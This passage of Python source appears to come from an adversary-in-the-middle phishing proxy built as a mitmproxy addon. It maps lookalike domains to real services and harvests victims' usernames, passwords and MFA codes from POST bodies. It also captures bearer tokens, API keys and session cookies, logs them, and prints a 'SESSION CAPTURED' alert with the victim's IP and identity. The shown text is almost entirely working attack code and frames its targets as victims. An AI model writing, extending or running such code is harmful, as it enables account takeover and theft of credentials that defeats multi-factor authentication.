            if session["status"] == "captured":
                _print_capture_alert(session)

            self._flush(session)

    def update_auth_headers(
        self,
        flow: http.HTTPFlow,
        url: str,
        platform: str,
        auth_headers: dict,
    ) -> None:
        """Record captured outbound auth headers and update session status."""
        with self._lock:
            session = self._get_or_create(flow)
            if session["platform"] == "unknown" and platform != "unknown":
                session["platform"] = platform

            session["auth_headers"].append({
                "timestamp": self._now(),
                "method":    flow.request.method,
                "url":       url,
                "headers":   auth_headers,
            })
            self._advance_status(session)
            self._flush(session)

    def get_all(self) -> list[dict]:
        """Return a snapshot of all current session records."""
        with self._lock:
            return list(self._store.values())


def _print_capture_alert(session: dict) -> None:
    """
    Print a highlighted alert to the mitmproxy console when a victim's
    full session has been stolen (credentials + auth cookies both captured).
    """
    sep = "=" * 60
    creds = session["credentials"][-1] if session["credentials"] else {}
    username_fields = creds.get("username", {})
    identity = next(iter(username_fields.values()), "unknown")

    print(f"\n{sep}")
    print(f"  *** SESSION CAPTURED ***")
    print(f"  Session ID : {session['id']}")
    print(f"  Platform   : {session['platform']}")
    print(f"  Victim IP  : {session['ip']}")
    print(f"  Identity   : {identity}")
    print(f"  First seen : {session['first_seen']}")
    print(f"  Captured   : {session['last_seen']}")
    print(f"  Saved to   : {LOG_SESSIONS}")
    print(f"{sep}\n")

SESSION_STORE = SessionStore()

class AitmLogger:
    """
    mitmproxy addon — captures authentication credentials, headers, and session cookies.

    Hooks:
      request()  — fires before the request reaches the upstream server.
                   • Step 2: Parses POST bodies for username / password / MFA fields.
                   • Step 3: Inspects outbound headers for Bearer tokens, Basic auth,
                             API keys, AWS signatures, and other auth headers.
      response() — fires after the upstream server replies.
                   • Step 1: Inspects Set-Cookie headers for session/auth tokens.
    """

    def request(self, flow: http.HTTPFlow) -> None:
        try:
            host        = flow.request.pretty_host
            url         = flow.request.url
            if host in _REVERSE_DOMAIN_MAP:
                real_host = _REVERSE_DOMAIN_MAP[host]
                print(f"[Spinex] Rewriting upstream: {host} → {real_host}")
                flow.request.host = real_host
                flow.request.headers["Host"] = real_host
            platforms   = _match_platform(host)
            h_platforms = _match_header_platform(host)

            auth_headers = _extract_auth_headers(flow, h_platforms)
            if auth_headers:
                platform = h_platforms[0] if h_platforms else "unknown"
                header_entry = {
                    "timestamp": str(datetime.datetime.now()),
                    "method":    flow.request.method,
                    "host":      host,
                    "url":       url,
                    "platform":  platform,
                    "headers":   auth_headers,
                }
                _append_log(LOG_HEADERS, header_entry)
                SESSION_STORE.update_auth_headers(flow, url, platform, auth_headers)

            if flow.request.method.upper() != "POST":
                return

            fields = _parse_post_body(flow)
            if not fields:
                return

            captured = {"username": {}, "password": {}, "mfa": {}}
            for field_name, field_value in fields.items():
                field_name  = convert_bytes(field_name)  if isinstance(field_name,  bytes) else str(field_name)
                field_value = convert_bytes(field_value) if isinstance(field_value, bytes) else str(field_value)
                bucket = _classify_field(field_name, platforms)
                if bucket:
                    captured[bucket][field_name] = field_value

            has_creds = any(captured[b] for b in ("username", "password", "mfa"))
            if not has_creds:
                return

            platform = platforms[0] if platforms else "unknown"
            entry = {
                "timestamp": str(datetime.datetime.now()),
                "host":      host,
                "url":       url,
                "platform":  platform,
                "creds":     {
                    "username": captured["username"],
                    "password": captured["password"],
                    "mfa":      captured["mfa"],
                },
            }
            _append_log(LOG_CREDS, entry)
            SESSION_STORE.update_credentials(flow, url, platform, captured)

        except Exception:
            traceback.print_exc()

    def response(self, flow: http.HTTPFlow) -> None:
        try:
            host      = flow.request.pretty_host
            url       = flow.request.url
            platforms = _match_platform(host)

            raw_cookies = flow.response.cookies
            if raw_cookies:
                auth_cookies    = {}
                skipped_cookies = {}

                for name, cookie_obj in raw_cookies.items():
                    if hasattr(cookie_obj, "value"):
                        value = cookie_obj.value
                    elif isinstance(cookie_obj, tuple) and len(cookie_obj) > 0:
                        value = cookie_obj[0]
                    else:
                        value = str(cookie_obj)

                    name  = convert_bytes(name)
                    value = convert_bytes(value)
                    is_auth, matched_platform = _is_auth_cookie(name, platforms)

                    if is_auth:
                        auth_cookies[name] = {"value": value, "platform": matched_platform}
                    elif DEBUG_SKIPPED:
                        skipped_cookies[name] = value

                if auth_cookies:
                    platform = platforms[0] if platforms else "unknown"
                    _append_log(LOG_COOKIES, {
                        "timestamp": str(datetime.datetime.now()),
                        "host":      host,
                        "url":       url,
                        "cookies":   auth_cookies,
                    })
                    SESSION_STORE.update_cookies(flow, url, platform, auth_cookies)

                if DEBUG_SKIPPED and skipped_cookies:
                    _append_log(LOG_SKIPPED, {
                        "timestamp": str(datetime.datetime.now()),
                        "host": host, "url": url, "skipped": skipped_cookies,
                    })

            _rewrite_response(flow)

        except Exception:
            traceback.print_exc()


addons = [AitmLogger()]
